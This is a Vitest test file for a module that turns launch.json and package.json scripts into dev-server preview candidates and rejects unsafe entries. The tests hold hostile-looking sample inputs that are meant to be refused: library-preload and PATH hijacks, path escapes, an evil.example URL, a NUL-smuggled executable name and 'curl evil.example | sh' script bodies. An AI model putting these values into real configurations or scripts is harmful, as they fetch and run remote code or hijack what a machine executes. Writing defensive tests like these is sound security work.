import { describe, expect, it } from "vitest";
import {
  packageManager,
  packageScriptCandidates,
  parseLaunchJson,
  previewCandidates,
  previewFingerprint,
  relativeFolder,
  scriptPort,
  type PreviewCandidate,
} from "./launchConfig";

const launch = (configurations: unknown[]) =>
  JSON.stringify({ version: "0.0.1", configurations });

describe("parseLaunchJson", () => {
  it("reads Claude Desktop's shape", () => {
    const { candidates, problems } = parseLaunchJson(
      launch([
        {
          name: "web",
          runtimeExecutable: "npm",
          runtimeArgs: ["run", "dev"],
          port: 5173,
          cwd: "${workspaceFolder}/apps/web",
          env: { NODE_ENV: "development", DEBUG: 1 },
          autoVerify: true,
        },
      ]),
    );
    expect(problems).toEqual([]);
    expect(candidates).toEqual([
      {
        key: "launch:web",
        label: "web",
        source: "launch.json",
        program: "npm",
        args: ["run", "dev"],
        cwd: "apps/web",
        env: { NODE_ENV: "development", DEBUG: "1" },
        port: 5173,
        autoPort: false,
        autoVerify: true,
      },
    ]);
  });

  it("runs a bare program with node, and keeps names literally", () => {
    const { candidates } = parseLaunchJson(
      launch([{ name: "srv", program: "server files/-main.js", args: ["--port", "4000"] }]),
    );
    expect(candidates[0].program).toBe("node");
    expect(candidates[0].args).toEqual(["server files/-main.js", "--port", "4000"]);
  });

  it("passes autoPort and a loopback url through", () => {
    const { candidates } = parseLaunchJson(
      launch([
        {
          name: "auto",
          runtimeExecutable: "python3",
          runtimeArgs: ["-m", "http.server"],
          autoPort: true,
          url: "http://127.0.0.1:8000/index.html",
        },
      ]),
    );
    expect(candidates[0].autoPort).toBe(true);
    expect(candidates[0].url).toBe("http://localhost:8000/index.html");
  });

  it("leaves out entries a stranger could use to widen what runs", () => {
    const { candidates, problems } = parseLaunchJson(
      launch([
        { name: "up", runtimeExecutable: "npm", cwd: "../other" },
        { name: "abs", runtimeExecutable: "npm", cwd: "/etc" },
        { name: "home", runtimeExecutable: "npm", cwd: "~/x" },
        { name: "path", runtimeExecutable: "npm", env: { PATH: "/tmp/evil" } },
        { name: "preload", runtimeExecutable: "npm", env: { DYLD_INSERT_LIBRARIES: "/x.dylib" } },
        { name: "badname", runtimeExecutable: "npm", env: { "A-B": "1" } },
        { name: "far", runtimeExecutable: "npm", url: "http://evil.example:80/" },
        { name: "userinfo", runtimeExecutable: "npm", url: "http://localhost:@evil.example/" },
        { name: "port", runtimeExecutable: "npm", port: 70_000 },
        { name: "nul", runtimeExecutable: "np\u0000m" },
        { name: "dash", runtimeExecutable: "--evil" },
        { name: "none" },
        { name: "args", runtimeExecutable: "npm", runtimeArgs: "run dev" },
        "not an object",
      ]),
    );
    expect(candidates).toEqual([]);
    expect(problems).toHaveLength(14);
  });

  it("refuses a name used twice, bad JSON and a missing list", () => {
    expect(
      parseLaunchJson(
        launch([
          { name: "a", runtimeExecutable: "npm" },
          { name: "a", runtimeExecutable: "pnpm" },
        ]),
      ).candidates,
    ).toHaveLength(1);
    expect(parseLaunchJson("{").problems[0]).toMatch(/not valid JSON/);
    expect(parseLaunchJson("{}").problems[0]).toMatch(/no configurations/);
    expect(parseLaunchJson("[]").problems[0]).toMatch(/no configurations/);
  });
});

describe("relativeFolder", () => {
  it("keeps a plain relative folder and refuses escapes", () => {
    expect(relativeFolder(undefined)).toBe("");
    expect(relativeFolder("./web app/.")).toBe("web app");
    expect(relativeFolder("-dash")).toBe("-dash");
    expect(relativeFolder("a/../..")).toBeUndefined();
    expect(relativeFolder("C:/x")).toBeUndefined();
    expect(relativeFolder("a\\b")).toBeUndefined();
    expect(relativeFolder(3)).toBeUndefined();
  });
});

describe("package scripts", () => {
  const pkg = JSON.stringify({
    scripts: {
      build: "vite build",
      dev: "vite --port 5174",
      start: "node server.js -p 4000",
      lint: "eslint .",
      preview: "",
    },
  });

  it("offers only dev server scripts, through the project's package manager", () => {
    const { candidates } = packageScriptCandidates(pkg, ["pnpm-lock.yaml"]);
    expect(candidates.map((c) => c.label)).toEqual(["pnpm run dev", "pnpm run start"]);
    expect(candidates[0]).toMatchObject({
      program: "pnpm",
      args: ["run", "dev"],
      port: 5174,
      scriptBody: "vite --port 5174",
    });
    expect(candidates[1].port).toBe(4000);
  });

  it("picks the package manager from the lockfile", () => {
    expect(packageManager([])).toBe("npm");
    expect(packageManager(["yarn.lock"])).toBe("yarn");
    expect(packageManager(["bun.lockb"])).toBe("bun");
    expect(packageManager(["package-lock.json", "pnpm-lock.yaml"])).toBe("pnpm");
  });

  it("reads ports from scripts", () => {
    expect(scriptPort("vite --port=3001")).toBe(3001);
    expect(scriptPort("next dev -p 3002")).toBe(3002);
    expect(scriptPort("vite")).toBeUndefined();
  });

  it("puts launch.json first and reports skipped files", () => {
    const { candidates, problems } = previewCandidates({
      launchJson: launch([{ name: "web", runtimeExecutable: "npm" }]),
      packageJson: pkg,
      lockfiles: [],
      skipped: ["package.json leads outside the project"],
    });
    expect(candidates[0].source).toBe("launch.json");
    expect(candidates[1].source).toBe("package.json");
    expect(problems).toEqual(["package.json leads outside the project"]);
    expect(previewCandidates({}).candidates).toEqual([]);
  });
});

describe("previewFingerprint", () => {
  const base: PreviewCandidate = {
    key: "script:dev",
    label: "npm run dev",
    source: "package.json",
    program: "npm",
    args: ["run", "dev"],
    cwd: "",
    env: { A: "1", B: "2" },
    autoPort: false,
    scriptBody: "vite",
  };

  it("is stable, and ignores the order of environment names", () => {
    expect(previewFingerprint(base)).toBe(previewFingerprint({ ...base }));
    expect(previewFingerprint(base)).toBe(
      previewFingerprint({ ...base, env: { B: "2", A: "1" } }),
    );
    expect(previewFingerprint(base)).toMatch(/^[0-9a-f]{64}$/);
  });

  it("changes when anything that decides what runs changes", () => {
    const print = previewFingerprint(base);
    for (const changed of [
      { ...base, program: "pnpm" },
      { ...base, args: ["run", "start"] },
      { ...base, cwd: "web" },
      { ...base, env: { A: "1", B: "3" } },
      { ...base, scriptBody: "vite && curl evil.example | sh" },
      { ...base, port: 1234 },
      { ...base, autoPort: true },
      { ...base, preScript: "curl evil.example | sh" },
      { ...base, postScript: "true" },
      { ...base, npmrcHash: "0".repeat(64) },
    ])
      expect(previewFingerprint(changed)).not.toBe(print);
  });
});
